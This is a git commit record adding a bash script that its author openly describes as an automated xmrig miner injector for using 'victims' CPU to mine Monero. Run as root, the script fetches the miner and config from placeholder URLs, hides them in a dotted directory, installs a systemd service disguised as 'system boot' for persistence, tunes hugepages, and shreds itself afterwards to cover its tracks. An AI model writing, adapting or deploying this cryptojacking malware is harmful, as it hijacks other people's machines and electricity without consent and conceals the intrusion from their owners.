ba6764e2ae436edc366b213ddd1712256bcd10dd
Raghavan005 <42708326+Raghavan005@users.noreply.github.com>
2021-08-11 12:51:36 +0530

    Add files via upload
    A simple automated xmrig miner injector..It injects xmrig miner as system service and uses 25% of victims cpu to mine monero.. It resgistered as syste service which perist along reboots and statrted automatically while system boots.
    
    Simple to use. kindly change the url of xmrig and config.json.
    Happy Injecting !!!

---
+++ xmrig injector.sh
@@ -0,0 +1,44 @@
+#!/bin/bash
+if [[ $EUID -eq 0 ]]
+then
+   dircheck="/usr/share/.logstxt"
+   filcheck="/etc/systemd/systemd/xmrig.service"
+   filename="$0"
+   exits () {
+    
+    if [[ -d "$dircheck" ]]
+    then
+       rm -r ${dircheck}
+    fi
+    
+    if [[ -f "$filcheck" ]]
+    then
+       rm ${filcheck}
+    fi
+   }
+   exits
+   files=$(curl -s -O < url for xmrig > -O < url for config.json >)
+   touch xmrig.service
+   per=$(chmod 777 xmrig config.json && chmod 644 xmrig.service)
+   dir=$(mkdir /usr/share/.logstxt)
+   move=$(mv xmrig config.json /usr/share/.logstxt/ && mv xmrig.service /etc/systemd/system/)
+   threads=$(lscpu -p | grep -c "^[0-9]") 
+   tf=$(printf %.f "$((25 * $threads))e-2")
+   append=$(echo -e "[Unit]\nDescription=system boot\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=1200\nUser=root\nExecStart=/usr/share/.logstxt/xmrig -c /usr/share/.logstxt/config.json --      threads=$tf\nRemainAfterExit=yes\nKillMode=process\n\n[Install]\nWantedBy=multi-user.target">/etc/systemd/system/xmrig.service)
+   sys=$(echo "vm.nr_hugepages=1280">>/etc/sysctl.conf)
+   system=$(sysctl --quiet --system && systemctl daemon-reload && systemctl enable --now xmrig --quiet)
+   
+   $files
+   $per
+   $dir
+   $move
+   $append
+   $sys
+   $system
+    
+   if [[ $? -eq 0 ]]
+   then 
+      shred -u ${filename}
+   fi
+else
+   echo "Please Run as root!"
